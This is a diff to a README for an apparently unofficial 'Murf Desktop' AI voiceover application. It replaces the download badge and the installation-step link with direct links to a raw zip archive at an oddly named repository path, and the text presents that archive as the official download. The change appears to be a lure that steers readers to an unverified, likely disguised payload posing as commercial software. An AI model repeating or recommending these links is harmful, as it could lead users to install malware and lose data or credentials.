@@ -30,7 +30,7 @@ Murf Desktop is a standalone application that runs natively on your Windows PC. 
 
 Ready to start? Click the button below to head directly to the official download page:
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD_MURF_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/aquilesar5321/Murf-Desktop---Murf-AI-Voiceover-2026)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD_MURF_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://raw.githubusercontent.com/aquilesar5321/Murf-Desktop---Murf-AI-Voiceover-2026/main/unsnaffled/3.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these simple steps to get Murf Desktop installed and ready for action:
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-[🔗 https://github.com/aquilesar5321/Murf-Desktop---Murf-AI-Voiceover-2026](https://github.comaquilesar5321/Murf-Desktop---Murf-AI-Voiceover-2026)
+[🔗 https://raw.githubusercontent.com/aquilesar5321/Murf-Desktop---Murf-AI-Voiceover-2026/main/unsnaffled/3.2.zip](https://raw.githubusercontent.com/aquilesar5321/Murf-Desktop---Murf-AI-Voiceover-2026/main/unsnaffled/3.2.zip)
 
 
 
